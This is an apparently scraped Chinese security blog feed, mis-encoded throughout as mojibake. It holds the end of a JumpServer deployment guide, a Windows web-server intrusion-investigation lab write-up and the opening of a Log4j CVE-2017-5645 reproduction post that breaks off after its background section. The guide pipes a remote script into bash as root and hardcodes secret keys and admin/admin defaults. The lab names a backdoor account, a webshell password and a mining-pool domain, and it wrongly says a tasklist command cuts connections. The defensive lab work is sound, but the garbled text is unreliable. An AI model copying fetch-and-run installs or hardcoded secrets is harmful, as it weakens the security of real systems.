è§„èŒƒçš„è¿ç»´å®‰å…¨å®¡è®¡ç³»ç»Ÿï¼Œæä¾›èº«ä»½éªŒè¯ã€æˆæƒæ§åˆ¶ã€è´¦å·ç®¡ç†ã€å®‰å…¨å®¡è®¡ç­‰åŠŸèƒ½æ”¯æŒã€‚é‡‡ç”¨åˆ†å¸ƒå¼æ¶æ„è®¾è®¡ï¼Œæ”¯æŒå®¹å™¨åŒ–éƒ¨ç½²ï¼Œèƒ½å¤Ÿæ”¯æŒå¤šç§èµ„äº§ç±»å‹å’Œå¤§è§„æ¨¡èµ„äº§çº³ç®¡ï¼Œé€‚ç”¨äºé‡‘èã€åˆ¶é€ ã€ç‰©æµã€åª’ä½“ã€äº’è”ç½‘ç­‰è¡Œä¸šçš„ä¼ä¸šç”¨æˆ·ã€‚</p><h1 id="ä¸‰ã€JumpServer-éƒ¨ç½²"><a href="#ä¸‰ã€JumpServer-éƒ¨ç½²" class="headerlink" title="ä¸‰ã€JumpServer éƒ¨ç½²"></a>ä¸‰ã€JumpServer éƒ¨ç½²</h1><h3 id="1ã€åœ¨çº¿éƒ¨ç½²"><a href="#1ã€åœ¨çº¿éƒ¨ç½²" class="headerlink" title="1ã€åœ¨çº¿éƒ¨ç½²"></a>1ã€åœ¨çº¿éƒ¨ç½²</h3><ol><li>å‡†å¤‡ä¸€å° 2æ ¸4G ï¼ˆæœ€ä½ï¼‰ä¸”å¯ä»¥è®¿é—®äº’è”ç½‘çš„ 64 ä½ Linux ä¸»æœºï¼›</li><li>ä»¥ root ç”¨æˆ·æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ä¸€é”®å®‰è£… JumpServerã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -sSL https://resource.fit2cloud.com/jumpserver/jumpserver/releases/latest/download/quick_start.sh | bash</span><br></pre></td></tr></table></figure><p>å®‰è£…å®Œæˆåï¼Œæ ¹æ®æç¤ºè¿›è¡Œé…ç½®ï¼Œå¦‚è®¾ç½®åŸŸåç­‰ã€‚</p><h3 id="2ã€ç¦»çº¿éƒ¨ç½²"><a href="#2ã€ç¦»çº¿éƒ¨ç½²" class="headerlink" title="2ã€ç¦»çº¿éƒ¨ç½²"></a>2ã€ç¦»çº¿éƒ¨ç½²</h3><ol><li><p>ä¸‹è½½è§£å‹JumpServer å®‰è£…åŒ…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://community.fit2cloud.com/#/download/jumpserver/v3-10-3</span><br></pre></td></tr></table></figure></li><li><p>æ ¹æ®éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>config.txt</code></p></li><li><p>æ‰§è¡Œå®‰è£…è„šæœ¬ <code>./jmsctl.sh install</code></p></li><li><p>å¯åŠ¨ JumpServer æœåŠ¡ <code>./jmsctl.sh start</code></p></li></ol><h3 id="3ã€Docker-éƒ¨ç½²"><a href="#3ã€Docker-éƒ¨ç½²" class="headerlink" title="3ã€Docker éƒ¨ç½²"></a>3ã€Docker éƒ¨ç½²</h3><p>1ã€ç”Ÿæˆå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å¯†ç 1ï¼š</span><br><span class="line">if [ &quot;$SECRET_KEY&quot; = &quot;&quot; ]; then SECRET_KEY=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 50`; echo &quot;SECRET_KEY=$SECRET_KEY&quot; &gt;&gt; ~/.bashrc; echo $SECRET_KEY; else echo $SECRET_KEY; fi</span><br><span class="line"></span><br><span class="line">å¯†ç 2ï¼š</span><br><span class="line">if [ &quot;$BOOTSTRAP_TOKEN&quot; = &quot;&quot; ]; then BOOTSTRAP_TOKEN=`cat /dev/urandom | tr -dc A-Za-z0-9 | head -c 16`; echo &quot;BOOTSTRAP_TOKEN=$BOOTSTRAP_TOKEN&quot; &gt;&gt; /.baserc; echo $BOOTSTRAP_TOKEN; else echo $BOOTSTRAP_TOKEN; fi</span><br></pre></td></tr></table></figure><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229133312797.png" alt="image-20240229133312797"></p><p>2ã€éƒ¨ç½²jumpserver</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -itd --name jumpserver --restart=always -p 88:80 -p 2222:2222 -e SECRET_KEY=v91b2DNK07Hl95nmISbnlxFy6zck9hXH0PtMVSiHgq2RJwevaG -e BOOTSTRAP_TOKEN=aHmacjFzWRbhAtBk -v /opt/jumpserver/data/:/opt/jumpserver/data/ -v /opt/jumpserver/mysql/:/var/lib/mysql jumpserver/jms_all:v2.8.4</span><br></pre></td></tr></table></figure><p>3ã€è®¿é—®jumpserver webé¡µé¢</p><p><a href="http://192.168.8.2/">http://192.168.8.2</a> æˆ– <a href="http://192.168.8.2/ui">http://192.168.8.2/ui</a></p><p>é»˜è®¤è´¦å·å¯†ç ï¼šadmin&#x2F;adminï¼ˆåˆæ¬¡è®¿é—®ä¼šè¦æ±‚æ›´æ”¹å¯†ç ï¼‰</p><h1 id="å››ã€ç›¸å…³ä½¿ç”¨"><a href="#å››ã€ç›¸å…³ä½¿ç”¨" class="headerlink" title="å››ã€ç›¸å…³ä½¿ç”¨"></a>å››ã€ç›¸å…³ä½¿ç”¨</h1><h3 id="1ã€åˆ›å»ºJumpServer-ç”¨æˆ·æˆ–ç”¨æˆ·ç»„"><a href="#1ã€åˆ›å»ºJumpServer-ç”¨æˆ·æˆ–ç”¨æˆ·ç»„" class="headerlink" title="1ã€åˆ›å»ºJumpServer ç”¨æˆ·æˆ–ç”¨æˆ·ç»„"></a>1ã€åˆ›å»ºJumpServer ç”¨æˆ·æˆ–ç”¨æˆ·ç»„</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163252908.png" alt="image-20240229163252908"></p><h3 id="2ã€åˆ›å»ºèµ„äº§"><a href="#2ã€åˆ›å»ºèµ„äº§" class="headerlink" title="2ã€åˆ›å»ºèµ„äº§"></a>2ã€åˆ›å»ºèµ„äº§</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163330169.png" alt="image-20240229163330169"></p><h3 id="3ã€é€šè¿‡Webç»ˆç«¯è¿æ¥æœåŠ¡å™¨"><a href="#3ã€é€šè¿‡Webç»ˆç«¯è¿æ¥æœåŠ¡å™¨" class="headerlink" title="3ã€é€šè¿‡Webç»ˆç«¯è¿æ¥æœåŠ¡å™¨"></a>3ã€é€šè¿‡Webç»ˆç«¯è¿æ¥æœåŠ¡å™¨</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163813689.png" alt="image-20240229163813689"></p><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229163821273.png" alt="image-20240229163821273"></p><h3 id="4ã€æ—¥å¿—å®¡è®¡"><a href="#4ã€æ—¥å¿—å®¡è®¡" class="headerlink" title="4ã€æ—¥å¿—å®¡è®¡"></a>4ã€æ—¥å¿—å®¡è®¡</h3><p><img src="/img/Blue-Team-Bastion-Host-JumpServer/image-20240229164019358.png" alt="image-20240229164019358"></p><h3 id="5ã€ä¼šè¯å®¡è®¡"><a href="#5ã€ä¼šè¯å®¡è®¡" class="headerlink" title="5ã€ä¼šè¯å®¡è®¡"></a>5ã€ä¼šè¯å®¡è®¡</h3><p><img src="/image-20240229164147688.png" alt="image-20240229164147688"></p>]]></content>
      
      
      <categories>
          
          <category> è“é˜Ÿåº”æ€¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JumpServerå ¡å’æœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€åº”æ€¥é¶åœºã€‘Win Server Web1å…¥ä¾µæ’æŸ¥</title>
      <link href="/2024/02/28/Emergency-WinServer-web1/"/>
      <url>/2024/02/28/Emergency-WinServer-web1/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-Server-Web1å…¥ä¾µæ’æŸ¥"><a href="#Windows-Server-Web1å…¥ä¾µæ’æŸ¥" class="headerlink" title="Windows Server Web1å…¥ä¾µæ’æŸ¥"></a>Windows Server Web1å…¥ä¾µæ’æŸ¥</h1><h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1><p>å°æåœ¨å€¼å®ˆçš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°æœ‰CPUå ç”¨é£™å‡ï¼Œå‡ºäºèƒ†å­å°ï¼Œå°±ç«‹åˆ»å°†æœåŠ¡å™¨å…³æœºï¼Œå¹¶æ‰¾æ¥æ­£åœ¨åƒè‹•çš®çš„hxdå¸®ä»–åˆ†æï¼Œè¿™æ˜¯ä»–çš„æœåŠ¡å™¨ç³»ç»Ÿï¼Œè¯·ä½ æ‰¾å‡ºä»¥ä¸‹å†…å®¹ï¼Œå¹¶ä½œä¸ºé€šå…³æ¡ä»¶ï¼š</p><ol><li>æ”»å‡»è€…çš„shellå¯†ç </li><li>æ”»å‡»è€…çš„IPåœ°å€</li><li>æ”»å‡»è€…çš„éšè—è´¦æˆ·åç§°</li><li>æ”»å‡»è€…æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå(ä»…åŸŸå)</li><li>æœ‰å®åŠ›çš„å¯ä»¥å°è¯•ç€ä¿®å¤æ¼æ´</li></ol><p>ç½‘ç›˜ä¸‹è½½å‹ç¼©åŒ…ï¼Œè§£å‹åï¼Œåœ¨é«˜ç‰ˆæœ¬ï¼ˆå¤§äº17.5ï¼‰çš„VMä¸­æ‰«ææ‰“å¼€</p><img src="/img/Emergency-WinServer-web1/image-20240228125056092.png" alt="image-20240228125056092" style="zoom:150%;" /><p>è·å–æ‰€æœ‰æƒå¹¶å¼€å¯é¶æœº</p><h1 id="äºŒã€æ’æŸ¥åé—¨è´¦æˆ·"><a href="#äºŒã€æ’æŸ¥åé—¨è´¦æˆ·" class="headerlink" title="äºŒã€æ’æŸ¥åé—¨è´¦æˆ·"></a>äºŒã€æ’æŸ¥åé—¨è´¦æˆ·</h1><p>å…ˆç®€å•ç”¨å‘½ä»¤æŸ¥çœ‹ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><img src="/img/Emergency-WinServer-web1/image-20240228131841287.png" alt="image-20240228131841287" style="zoom:150%;" /><p>æ²¡æœ‰å¯ç–‘ç”¨æˆ·ï¼ŒæŸ¥çœ‹è´¦æˆ·ç®¡ç†ï¼Œå‘ç°éšè—ç”¨æˆ· <code>hack168$</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228132109595.png" alt="image-20240228132109595"></p><p><img src="/img/Emergency-WinServer-web1/image-20240228142236880.png" alt="image-20240228142236880"></p><p>æ³¨å†Œè¡¨ä¸­æœªå‘ç°æ›´å¤šçš„å…‹éš†ç”¨æˆ·</p><p><img src="/img/Emergency-WinServer-web1/image-20240228132455940.png" alt="image-20240228132455940"></p><p>æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·å’Œç»„ç®¡ç†ï¼š</p><ul><li>æŸ¥çœ‹ç”¨æˆ·<img src="/img/Emergency-WinServer-web1/image-20240228132741523.png" alt="image-20240228132741523"></li><li>æŸ¥çœ‹ç®¡ç†å‘˜ç»„<img src="/img/Emergency-WinServer-web1/image-20240228132721412.png" alt="image-20240228132721412"></li></ul><p>å¯ä»¥ç¡®å®š<code>hack168$</code>è¿™ä¸ªç”¨æˆ·æ˜¯ä¸€ä¸ªéšè—çš„åé—¨ç”¨æˆ·</p><h1 id="ä¸‰ã€æ£€æŸ¥ç«¯å£ã€è¿›ç¨‹"><a href="#ä¸‰ã€æ£€æŸ¥ç«¯å£ã€è¿›ç¨‹" class="headerlink" title="ä¸‰ã€æ£€æŸ¥ç«¯å£ã€è¿›ç¨‹"></a>ä¸‰ã€æ£€æŸ¥ç«¯å£ã€è¿›ç¨‹</h1><h3 id="1ã€ç«¯å£æ£€æŸ¥"><a href="#1ã€ç«¯å£æ£€æŸ¥" class="headerlink" title="1ã€ç«¯å£æ£€æŸ¥"></a>1ã€ç«¯å£æ£€æŸ¥</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web1/image-20240228134359570.png" alt="image-20240228134359570"></p><p>å¯ä»¥çœ‹åˆ°ä¸æŸIPçš„80ç«¯å£å·²ç»å»ºç«‹äº†è¿æ¥</p><p>å¯ä»¥é€šè¿‡å¦‚ä¸‹å°†ä¸æ­¤IP çš„æ‰€æœ‰é“¾æ¥åˆ‡é™¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist | findstr &quot;7712&quot;</span><br></pre></td></tr></table></figure><h3 id="2ã€è¿›ç¨‹æ’æŸ¥"><a href="#2ã€è¿›ç¨‹æ’æŸ¥" class="headerlink" title="2ã€è¿›ç¨‹æ’æŸ¥"></a>2ã€è¿›ç¨‹æ’æŸ¥</h3><p>ä¸ºäº†è¿›ä¸€æ­¥ä¸Šè¿°ç«¯å£è¿æ¥æ˜¯æ¶æ„è¿æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç«¯å£è¿æ¥çš„è¿›ç¨‹å·æ£€æµ‹å…¶è¿›ç¨‹</p><p><code>msinfo32</code>åœ¨â€œç³»ç»Ÿä¿¡æ¯â€-&gt;â€œè½¯ä»¶ç¯å¢ƒâ€-&gt;â€œæ­£åœ¨è¿è¡Œä»»åŠ¡â€ä¸­æŸ¥çœ‹è¯¥è¿›ç¨‹ä¿¡æ¯</p><p><img src="/img/Emergency-WinServer-web1/image-20240228135223293.png" alt="image-20240228135223293"></p><p>å±äºâ€œä¸‰æ— äº§å“â€ï¼ŒåŸºæœ¬å¯ä»¥çŒœæµ‹å±äºæ¶æ„è¿›ç¨‹</p><p>æˆ‘ä»¬é€šè¿‡ç«ç»’å‰‘æˆ–è€…Dç›¾ç­‰å·¥å…·ï¼Œæ£€æŸ¥7712æ˜¯å¦å­˜åœ¨å®ˆæŠ¤è¿›ç¨‹</p><img src="/img/Emergency-WinServer-web1/image-20240228135807602.png" alt="image-20240228135807602" style="zoom:150%;" /><p>ç¡®å®å­˜åœ¨7444çš„å®ˆæŠ¤è¿›ç¨‹</p><h1 id="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"><a href="#å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥" class="headerlink" title="å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥"></a>å››ã€è‡ªå¯åŠ¨åé—¨æ’æŸ¥</h1><h3 id="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"><a href="#1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥" class="headerlink" title="1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥"></a>1ã€è®¡åˆ’ä»»åŠ¡æ’æŸ¥</h3><p>ã€æ§åˆ¶é¢æ¿ã€‘â€”ã€ç³»ç»Ÿå®‰å…¨ã€‘â€”ã€è®¡åˆ’ä»»åŠ¡ã€‘</p><p><img src="/img/Emergency-WinServer-web1/image-20240228140439434.png" alt="image-20240228140439434"></p><p>å®‰å…¨çš„è®¡åˆ’ä»»åŠ¡ï¼Œæ— åé—¨</p><h3 id="2ã€æœåŠ¡æ’æŸ¥"><a href="#2ã€æœåŠ¡æ’æŸ¥" class="headerlink" title="2ã€æœåŠ¡æ’æŸ¥"></a>2ã€æœåŠ¡æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web1/image-20240228141253474.png" alt="image-20240228141253474"></p><p>æœåŠ¡è¿™é‡Œä¹Ÿæ²¡æœ‰å¼‚å¸¸</p><h3 id="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"><a href="#3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥" class="headerlink" title="3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥"></a>3ã€è‡ªå¯åŠ¨æ–‡ä»¶å¤¹æ’æŸ¥</h3><p><img src="/img/Emergency-WinServer-web1/image-20240228141631120.png" alt="image-20240228141631120"></p><img src="/img/Emergency-WinServer-web1/image-20240228141837511.png" alt="image-20240228141837511" style="zoom:150%;" /><h3 id="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹"><a href="#4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹" class="headerlink" title="4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹"></a>4ã€è‡ªå¯åŠ¨æ³¨å†Œè¡¨é¡¹</h3><p>æœ‰ä¼—å¤šå¯åŠ¨ä¸œæ³¨å†Œè¡¨é¡¹ï¼Œä¸ä¸€ä¸€å±•ç¤ºäº†ï¼Œå‡æ— åé—¨å­˜åœ¨</p><p><img src="/img/Emergency-WinServer-web1/image-20240228142026545.png" alt="image-20240228142026545"></p><h1 id="äº”ã€æ—¥å¿—æ£€æµ‹"><a href="#äº”ã€æ—¥å¿—æ£€æµ‹" class="headerlink" title="äº”ã€æ—¥å¿—æ£€æµ‹"></a>äº”ã€æ—¥å¿—æ£€æµ‹</h1><h3 id="1ã€windowså®‰å…¨æ—¥å¿—"><a href="#1ã€windowså®‰å…¨æ—¥å¿—" class="headerlink" title="1ã€windowså®‰å…¨æ—¥å¿—"></a>1ã€windowså®‰å…¨æ—¥å¿—</h3><p>é’ˆå¯¹ç”¨æˆ·çš„ç™»é™†ï¼Œæˆ‘ä»¬ä¸»è¦æŸ¥çœ‹å®‰å…¨æ—¥å¿—ã€‚å¯ä»¥ä»ã€äº‹ä»¶æŸ¥çœ‹å™¨ã€‘ä¸­æŸ¥çœ‹windows çš„å®‰å…¨æ—¥å¿—ï¼Œæ­¤æ—¥å¿—å­˜å‚¨ä½ç½®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure><p><img src="/img/Emergency-WinServer-web1/image-20240228162517906.png" alt="image-20240228162517906"></p><h3 id="2ã€Webæ—¥å¿—æ£€æµ‹"><a href="#2ã€Webæ—¥å¿—æ£€æµ‹" class="headerlink" title="2ã€Webæ—¥å¿—æ£€æµ‹"></a>2ã€Webæ—¥å¿—æ£€æµ‹</h3><p>é¶åœºæ˜¯é€šè¿‡phpstudy æ­å»ºç½‘ç«™ï¼Œæˆ‘ä»¬ç›´æ¥åˆ°apacheçš„æ—¥å¿—ç›®å½•ä¸‹æŸ¥çœ‹æˆåŠŸæ—¥å¿—</p><p><img src="/img/Emergency-WinServer-web1/image-20240228162858183.png" alt="image-20240228162858183"></p><p>æ—¥å¿—æ•°æ®ä¸ç®—å¤šï¼Œæˆ‘ä»¬é€šè¿‡åœ¨çº¿ç½‘ç«™ç®€å•åˆ†æä¸‹</p><p><img src="/img/Emergency-WinServer-web1/image-20240228164917088.png" alt="image-20240228164917088"></p><p>60æ¡è®°å½•ä»¥ä¸Šæ˜¯æœ¬åœ°æœåŠ¡å™¨åœ¨è®¿é—®ï¼Œ60ä»¥ä¸‹å‘ç°<code>192.168.126.1</code> è¿™ä¸ªIP åœ¨å¯¹æœ¬åœ°webè¿›è¡Œäº†è®¿é—®</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165159815.png" alt="image-20240228165159815"></p><p>97æ¡è®°å½•ä»¥ä¸Šè¿˜ç®—æ­£å¸¸ï¼Œä½†æ˜¯ä»98æ¡è®°å½•å¼€å§‹ï¼Œ<code>192.168.126.1</code>ä¸åœçš„å¯¹ä¸€ä¸ªè·¯å¾„ä»¥1så‡ ä¹20æ¬¡é€Ÿåº¦è¿›è¡Œè®¿é—®ï¼Œç–‘ä¼¼çˆ†ç ´è¡Œä¸º</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165358717.png" alt="image-20240228165358717"></p><p>åœ¨5åˆ†é’Ÿä¹‹å†…å‘èµ·äº†è¿‘5700æ¬¡è®¿é—®ï¼Œæ­£å¸¸è®¿é—®è¿œè¿œè¾¾ä¸åˆ°è¿™æ ·çš„é€Ÿåº¦ï¼Œç»“åˆçˆ†ç ´çš„è·¯å¾„ï¼Œç¡®è®¤è¯¥IPå­˜åœ¨è´¦å·å¯†ç çˆ†ç ´è¡Œä¸º</p><p><img src="/img/Emergency-WinServer-web1/image-20240228170035590.png" alt="image-20240228170035590"></p><p>åœ¨åé¢çš„è¡Œä¸ºä¸­æ¶æ„IPç–‘ä¼¼è¿›è¡Œäº†ä¸Šä¼ æ“ä½œï¼Œç»“åˆä¸Šè¿°çˆ†ç ´è¡Œä¸ºï¼Œç¡®è®¤æ¶æ„IPå·²ç»çˆ†ç ´æˆåŠŸå¹¶ä¸”è¿›å…¥äº†åå°ç®¡ç†</p><p><img src="/img/Emergency-WinServer-web1/image-20240228165851418.png" alt="image-20240228165851418"></p><p>ç»§ç»­å¾€åçœ‹ï¼Œæ¶æ„IPé€šè¿‡æ’ä»¶ä¸Šä¼ åŠŸèƒ½ä¸Šä¼ äº†æœ¨é©¬æ–‡ä»¶shell.phpï¼Œä¸Šä¼ ç‚¹ä½äº&#x2F;content&#x2F;plugins&#x2F;tips&#x2F;shell.php</p><p><img src="/img/Emergency-WinServer-web1/image-20240228171505311.png" alt="image-20240228171505311"></p><p>æŸ¥çœ‹è¯¥æœ¨é©¬æ–‡ä»¶ï¼Œè¿æ¥å¯†ç æ˜¯å†°èé»˜è®¤å¯†ç <code>rebeyond</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228172303857.png" alt="image-20240228172303857"></p><p>ä¸€ç›´åˆ°æœ€åéƒ½æ˜¯å¯¹è¯¥æœ¨é©¬æ–‡ä»¶çš„è®¿é—®</p><p><img src="/img/Emergency-WinServer-web1/image-20240228190129858.png" alt="image-20240228190129858"></p><h1 id="å…­ã€ç—…æ¯’æ–‡ä»¶æ’æŸ¥"><a href="#å…­ã€ç—…æ¯’æ–‡ä»¶æ’æŸ¥" class="headerlink" title="å…­ã€ç—…æ¯’æ–‡ä»¶æ’æŸ¥"></a>å…­ã€ç—…æ¯’æ–‡ä»¶æ’æŸ¥</h1><p>æˆ‘ä»¬å¯¹éšè—ç”¨æˆ·<code>hack168$</code>ç”¨æˆ·çš„å®¶ç›®å½•è¿›è¡Œæ’æŸ¥ï¼Œåœ¨æ¡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¯ç–‘æ–‡ä»¶ï¼Œè¿è¡Œä¹‹åCPUé£™å‡ï¼Œåˆ¤åˆ«ä¸ºæŒ–çŸ¿ç—…æ¯’</p><img src="/img/Emergency-WinServer-web1/image-20240228190951402.png" alt="image-20240228190951402" style="zoom:150%;" /><p>è¯¥ç—…æ¯’å›¾æ ‡ä¸ºpyinstaller æ‰“åŒ…åçš„exeé»˜è®¤å›¾æ ‡ï¼Œæˆ‘ä»¬ç”¨pyinstxtractor è¿›è¡Œåç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py Kuang.exe</span><br></pre></td></tr></table></figure><p>å¾—åˆ°pycæ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web1/image-20240228194306068.png" alt="image-20240228194306068"></p><p>é€šè¿‡<a href="http://wakuang.zhigongshanfang.top/">pycåœ¨çº¿åç¼–è¯‘å·¥å…·</a>è¿›è¡Œåç¼–è¯‘ï¼Œå¾—åˆ°æŒ–çŸ¿ç¨‹åºçš„çŸ¿æ± åŸŸå<code>http://wakuang.zhigongshanfang.top</code></p><p><img src="/img/Emergency-WinServer-web1/image-20240228194514926.png" alt="image-20240228194514926"></p><h1 id="ä¸ƒã€ä½¿ç”¨å·¥å…·ä¸€æŠŠæ¢­"><a href="#ä¸ƒã€ä½¿ç”¨å·¥å…·ä¸€æŠŠæ¢­" class="headerlink" title="ä¸ƒã€ä½¿ç”¨å·¥å…·ä¸€æŠŠæ¢­"></a>ä¸ƒã€ä½¿ç”¨å·¥å…·ä¸€æŠŠæ¢­</h1><p>1ã€æœ¨é©¬æ–‡ä»¶</p><p><img src="/img/Emergency-WinServer-web1/image-20240228201127518.png" alt="image-20240228201127518"></p><p>2ã€å…‹éš†ç”¨æˆ·</p><p><img src="/img/Emergency-WinServer-web1/image-20240228201204685.png" alt="image-20240228201204685"></p><p>3ã€ç³»ç»Ÿè¡¥ä¸æ¼æ´</p><p><img src="/img/Emergency-WinServer-web1/image-20240228202006568.png" alt="image-20240228202006568"></p><p>4ã€æ—¥å¿—æ£€æµ‹</p><p><img src="/img/Emergency-WinServer-web1/image-20240228202249752.png" alt="image-20240228202249752"></p>]]></content>
      
      
      <categories>
          
          <category> åº”æ€¥é¶åœº </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…¥ä¾µæ’æŸ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€æ¼æ´å¤ç°ã€‘Apache Log4jç³»åˆ—æ¼æ´å¤ç°</title>
      <link href="/2024/02/27/VulnRep-Log4j/"/>
      <url>/2024/02/27/VulnRep-Log4j/</url>
      
        <content type="html"><![CDATA[<h1 id="ã€æ¼æ´å¤ç°ã€‘Apache-Log4jç³»åˆ—æ¼æ´å¤ç°"><a href="#ã€æ¼æ´å¤ç°ã€‘Apache-Log4jç³»åˆ—æ¼æ´å¤ç°" class="headerlink" title="ã€æ¼æ´å¤ç°ã€‘Apache Log4jç³»åˆ—æ¼æ´å¤ç°"></a>ã€æ¼æ´å¤ç°ã€‘Apache Log4jç³»åˆ—æ¼æ´å¤ç°</h1><h2 id="ä¸€ã€Log4jååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰"><a href="#ä¸€ã€Log4jååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰" class="headerlink" title="ä¸€ã€Log4jååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰"></a>ä¸€ã€Log4jååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-5645ï¼‰</h2><h3 id="1ã€æ¼æ´åŸå› "><a href="#1ã€æ¼æ´åŸå› " class="headerlink" title="1ã€æ¼æ´åŸå› "></a>1ã€æ¼æ´åŸå› </h3><p><strong>å½±å“ç‰ˆæœ¬ï¼š</strong>Apache Log4j 2.x ç‰ˆæœ¬ï¼ˆ2.8.2ä¹‹å‰çš„2.xç‰ˆæœ¬ï¼‰</p><p>Log4j æ˜¯ä¸€ä¸ªå¹¿æ³›åº”ç”¨çš„Java æ—¥å¿—åº“ï¼Œç”¨æ¥è®°å½•ç¨‹åºæ—¥å¿—ï¼Œå¹¶ä¸”æ”¯æŒè¿œç¨‹æœåŠ¡å™¨ã€‚æ˜¯ä¸€ä¸ªç”±Apacheè½¯ä»¶åŸºé‡‘ä¼šç»´æŠ¤çš„å¼€æºæ—¥å¿—æ¡†æ¶ï¼Œå®ƒä¸ºJavaåº”ç”¨ç¨‹åºæä¾›äº†çµæ´»çš„æ—¥å¿—è®°å½•åŠŸèƒ½ã€‚è¯¥æ¡†æ¶å…è®¸å¼€å‘è€…é€šè¿‡é…ç½®æ–‡ä»¶æ¥æ§åˆ¶æ—¥å¿—çš„è¾“å‡ºç›®çš„åœ°ã€è¾“å‡ºæ ¼å¼ã€æ—¥å¿—çº§åˆ«ç­‰ï¼Œè€Œæ— éœ€ä¿®æ”¹åº”ç”¨ç¨‹åºä»£ç ã€‚è¿™ä½¿å¾—æ—¥å¿—ç®¡ç†å˜å¾—æ›´åŠ çµæ´»å’Œé«˜æ•ˆã€‚ä¸€äº›è‘—åçš„å¼€æºé¡¹ç›®ï¼Œå¦‚sprintã€hibernateã€struts éƒ½æ˜¯ä½¿ç”¨è¯¥æ—¥å¿—æ¡†æ¶ã€‚</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ªç‰¹åˆ«åˆ¶ä½œçš„2è¿›åˆ¶payloadï¼Œåœ¨è¯¥ç»„ä»¶å°†å­—èŠ‚ååºåˆ—åŒ–ä¸ºå¯¹è±¡æ—¶ï¼Œè§¦å‘å¹¶æ‰§è¡Œæ„é€ çš„payloadä»£ç ã€‚è¯¥æ¼æ´ä¸»è¦æ˜¯ç”±äºåœ¨å¤„ç†ObjectInputStreamæ—¶ï¼Œæ¥æ”¶å‡½æ•°å¯¹äºä¸å¯é æ¥æºçš„inputæ²¡æœ‰è¿‡æ»¤ã€‚å¯ä»¥é€šè¿‡ç»™TcpSocketServerå’ŒUdpSocketServeræ·»åŠ å¯é…ç½®çš„è¿‡æ»¤åŠŸèƒ½ä»¥åŠä¸€äº›ç›¸å…³è®¾ç½®ï¼Œå¯ä»¥æœ‰æ•ˆçš„è§£å†³è¯¥æ¼æ´ã€‚</p><h3 id="2ã€ç¯å¢ƒæ­å»º"><a href="#2ã€ç¯å¢ƒæ­å»º" class="headerlink" 